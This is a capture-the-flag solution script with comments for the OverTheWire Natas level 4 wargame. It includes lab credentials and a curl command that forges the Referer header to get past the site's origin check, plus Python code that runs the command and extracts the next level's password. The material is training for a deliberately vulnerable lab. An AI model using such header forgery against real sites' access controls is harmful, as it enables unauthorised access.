# Natas Level 3 → Level 4
# Username: natas4
# URL:      http://natas4.natas.labs.overthewire.org

# natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ


# so trying with curl
# curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ http://natas4.natas.labs.overthewire.org/  -I

# HINTS :
# Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"


# just send custom header to as the natas5 url link to natas 4 url with username and password

# curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org/
# The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK\



import subprocess
import sys

import re

def main():
    # -s means silent we don't require
    command="curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ -H 'Referer: http://natas5.natas.labs.overthewire.org/' http://natas4.natas.labs.overthewire.org/"

    try:
        # sspawn that shell to run it
        result=subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            check=True
        )

        if result.stdout:
            # extract the password form the entire html
            match = re.search(r'password for natas5 is ([A-Za-z0-98]+)', result.stdout)
            # print(match)
            print(match.group(0))
            # Remove shell whitespaces plls
            # print(result.stdout.strip())
        else :
            print("No results found")
    # error handling not needed but still
    except subprocess.CalledProcessError as e:
        print(f"Command faiiled with exit code {e.returncode}")
        if e.stderr:
            print(f"Error : {e.stderr}")
        sys.exit(1) # need to exit the spawneed shell or it takes memeory
    except FileNotFoundError :
       print("Error: curl might be uninstalled or file not there")
       sys.exit(1) 



if __name__=="__main__":
    main()    


# password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK